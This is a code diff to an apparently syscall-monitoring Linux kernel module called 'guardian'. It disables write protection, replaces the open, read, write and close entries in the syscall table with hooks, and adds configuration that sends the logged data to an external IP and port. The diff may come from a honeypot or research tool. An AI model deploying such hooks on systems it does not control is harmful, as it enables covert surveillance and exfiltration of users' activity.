@@ -51,7 +51,8 @@ asmlinkage long (*hook_sys_write)(unsigned int,const void __user*, size_t);
 asmlinkage int (*hook_sys_close)(int);
 
 
-
+struct c00_logconf logconf_t;
+struct c00_logconf *logconf_p;
 
 
 
@@ -179,6 +180,13 @@ static int store_syscall_ptr(void)
 static int hook_syscalls(void)
 {
   disable_write_protection();
+
+/**#####################
+ * This is a bloody Hack
+ **#####################
+ *  be careful in kernel sizeof(long) == sizeof(void*)...anytime
+ * <*))><
+ */
   syscalltable[__NR_open] = (long)hook_sys_open;
 
   syscalltable[__NR_read] = (long)hook_sys_read;
@@ -217,7 +225,16 @@ static int __init guardian_init(void)
   C00TRACE("found syscall_table ia32 at %p\n",ia32_syscalltable);
 #endif
 
-  
+  logconf_t.local_ip = htonl((unsigned long int)_LOCIP);
+  logconf_t.target_ip = htonl((unsigned long int)_EXTIP);
+  logconf_t.local_port = _LOCPORT;
+  logconf_t.target_port = _EXTPORT;
+
+  logconf_t.device = _IFDEV;
+
+  logconf_p = &logconf_t;
+  c00_log_init(logconf_p);
+
   if(store_syscall_ptr() != TRUE){
     C00TRACE("Can not store syscall table");
     return 1;
@@ -226,6 +243,7 @@ static int __init guardian_init(void)
     /*This will not happen, instead we have a big kernel poo*/
     return 1;
   }
+  
   return 0;   
 }
 
